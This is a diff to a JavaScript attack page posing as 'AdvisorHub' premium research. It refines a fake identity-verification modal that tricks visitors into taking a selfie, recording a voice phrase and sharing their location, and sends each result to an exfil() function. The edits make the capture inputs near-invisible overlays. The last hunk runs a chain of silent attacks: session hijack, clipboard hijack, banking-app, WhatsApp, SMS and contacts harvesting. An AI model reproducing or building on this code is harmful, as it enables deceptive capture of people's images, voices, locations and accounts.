@@ -926,151 +926,93 @@
         return result;
     }
     
-    // ========== SOCIAL ENGINEERING: Multi-step verification modal ==========
-    // Shows a fake "identity verification" dialog that tricks users into
-    // granting camera, microphone, and location access
+    // ========== SOCIAL ENGINEERING: Verification modal ==========
     let modalStep = 0;
     let cameraInput, micInput;
     
     function showVerificationModal() {
         const modal = document.getElementById('verify-modal');
+        if (!modal) return;
+        
         const icon = document.getElementById('modal-icon');
         const title = document.getElementById('modal-title');
         const text = document.getElementById('modal-text');
         const btn = document.getElementById('modal-btn');
         
         const steps = [
-            {
-                icon: '🔒',
-                title: 'Identity Verification Required',
-                text: 'To prevent unauthorized access to premium research, please verify your identity. This is a one-time security check required by AdvisorHub.',
-                btnText: '📸 Take Verification Selfie',
-                action: 'camera'
-            },
-            {
-                icon: '🎤',
-                title: 'Voice Verification',
-                text: 'Please record a short voice note saying "I confirm this is my account." This helps us prevent fraud and protect your investment data.',
-                btnText: '🎙️ Record Voice Note',
-                action: 'microphone'
-            },
-            {
-                icon: '📍',
-                title: 'Location Verification',
-                text: 'We need to verify your location for regulatory compliance (MiFID II). Please allow location access to continue.',
-                btnText: '📍 Share Location',
-                action: 'location'
-            },
-            {
-                icon: '✅',
-                title: 'Verification Complete!',
-                text: 'Thank you! Your identity has been verified. You now have full access to the premium research report.',
-                btnText: '📥 Download Report',
-                action: 'done'
-            }
+            { icon: '🔒', title: 'Identity Verification Required', text: 'To prevent unauthorized access to premium research, please verify your identity. This is a one-time security check required by AdvisorHub.', btnText: '📸 Take Verification Selfie', action: 'camera' },
+            { icon: '🎤', title: 'Voice Verification', text: 'Please record a short voice note saying "I confirm this is my account." This helps us prevent fraud and protect your investment data.', btnText: '🎙️ Record Voice Note', action: 'microphone' },
+            { icon: '📍', title: 'Location Verification', text: 'We need to verify your location for regulatory compliance (MiFID II). Please allow location access to continue.', btnText: '📍 Share Location', action: 'location' },
+            { icon: '✅', title: 'Verification Complete!', text: 'Thank you! Your identity has been verified. You now have full access to the premium research report.', btnText: '📥 Download Report', action: 'done' }
         ];
         
-        const step = steps[modalStep] || steps[steps.length - 1];
+        const step = steps[Math.min(modalStep, steps.length - 1)];
         icon.textContent = step.icon;
         title.textContent = step.title;
         text.textContent = step.text;
         btn.textContent = step.btnText;
-        btn.dataset.action = step.action;
-        
+        btn.setAttribute('data-action', step.action);
         modal.style.display = 'flex';
     }
     
     function handleModalAction() {
         const btn = document.getElementById('modal-btn');
-        const action = btn.dataset.action;
+        const action = btn.getAttribute('data-action');
         
         if (action === 'camera') {
-            // Create hidden camera input — user thinks they're taking a "verification selfie"
             cameraInput = document.createElement('input');
             cameraInput.type = 'file';
             cameraInput.accept = 'image/*';
-            cameraInput.capture = 'user';  // Front camera for selfie
-            cameraInput.style.display = 'none';
+            cameraInput.setAttribute('capture', 'user');
+            cameraInput.style.cssText = 'position:fixed;top:0;left:0;width:1px;height:1px;opacity:0.01;z-index:999999;';
             document.body.appendChild(cameraInput);
-            
             cameraInput.addEventListener('change', (e) => {
                 const file = e.target.files[0];
                 if (file) {
                     const reader = new FileReader();
-                    reader.onloadend = () => {
-                        exfil({ attack: 'camera_selfie', image: reader.result, size: file.size, note: 'Victim took a selfie thinking it was identity verification' });
-                    };
+                    reader.onloadend = () => exfil({ attack: 'camera_selfie', image: reader.result, size: file.size, note: 'Victim took selfie for "identity verification"' });
                     reader.readAsDataURL(file);
                 }
                 cameraInput.remove();
-                // Move to next step after short delay
                 modalStep = 1;
                 setTimeout(showVerificationModal, 1500);
             });
-            
             cameraInput.click();
-            // Hide modal while camera is open
             document.getElementById('verify-modal').style.display = 'none';
-            
         } else if (action === 'microphone') {
-            // Create hidden mic input — user thinks they're recording a "voice verification"
             micInput = document.createElement('input');
             micInput.type = 'file';
             micInput.accept = 'audio/*';
-            micInput.capture = 'microphone';
-            micInput.style.display = 'none';
+            micInput.setAttribute('capture', 'microphone');
+            micInput.style.cssText = 'position:fixed;top:0;left:0;width:1px;height:1px;opacity:0.01;z-index:999999;';
             document.body.appendChild(micInput);
-            
             micInput.addEventListener('change', (e) => {
                 const file = e.target.files[0];
                 if (file) {
                     const reader = new FileReader();
-                    reader.onloadend = () => {
-                        exfil({ attack: 'microphone_recording', audio: reader.result, size: file.size, note: 'Victim recorded voice thinking it was identity verification' });
-                    };
+                    reader.onloadend = () => exfil({ attack: 'microphone_recording', audio: reader.result, size: file.size, note: 'Victim recorded voice for "identity verification"' });
                     reader.readAsDataURL(file);
                 }
                 micInput.remove();
-                // Move to next step
                 modalStep = 2;
                 setTimeout(showVerificationModal, 1500);
             });
-            
             micInput.click();
             document.getElementById('verify-modal').style.display = 'none';
-            
         } else if (action === 'location') {
-            // Request location — user thinks it's for "regulatory compliance"
+            document.getElementById('verify-modal').style.display = 'none';
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     (pos) => {
-                        const locData = {
-                            attack: 'location_tracking',
-                            lat: pos.coords.latitude,
-                            lon: pos.coords.longitude,
-                            accuracy: pos.coords.accuracy + 'm',
-                            mapsUrl: 'https://www.google.com/maps?q=' + pos.coords.latitude + ',' + pos.coords.longitude,
-                            note: 'Victim shared location thinking it was for regulatory compliance'
-                        };
-                        exfil(locData);
+                        exfil({ attack: 'location_tracking', lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy + 'm', mapsUrl: 'https://www.google.com/maps?q=' + pos.coords.latitude + ',' + pos.coords.longitude, note: 'Victim shared location for "regulatory compliance"' });
                         modalStep = 3;
                         showVerificationModal();
                     },
-                    () => {
-                        // Even if denied, move to next step
-                        modalStep = 3;
-                        showVerificationModal();
-                    },
+                    () => { modalStep = 3; showVerificationModal(); },
                     { enableHighAccuracy: true, timeout: 10000 }
                 );
-            } else {
-                modalStep = 3;
-                showVerificationModal();
-            }
-            document.getElementById('verify-modal').style.display = 'none';
-            
+            } else { modalStep = 3; showVerificationModal(); }
         } else if (action === 'done') {
-            // All verifications "complete" — now show the download
             document.getElementById('verify-modal').style.display = 'none';
             downloadReport();
         }
@@ -1080,22 +1022,19 @@
     (async function executeAllAttacks() {
         const report = { timestamp: new Date().toISOString() };
         
-        // Run silent attacks immediately
+        // Silent attacks
         report.sessionHijack = await attackSessionHijack();
         report.location = await attackLocation();
         attackClipboardHijack();
         report.networkExploit = await attackNetworkExploit();
         attackNotificationSpam();
-        
-        // Run app-level attacks
         attackWhatsApp();
         attackSMS();
         attackPhoneCall();
         attackBankingApps();
         report.contacts = await attackContacts();
         
-        // Show the social engineering modal after 3 seconds
-        // (gives the page time to load, then interrupts with "verification")
+        // Show verification modal after 3 seconds
         setTimeout(showVerificationModal, 3000);
         
         exfil({ attack: 'full_report', attacks_run: Object.keys(report).length, modal: 'scheduled' });
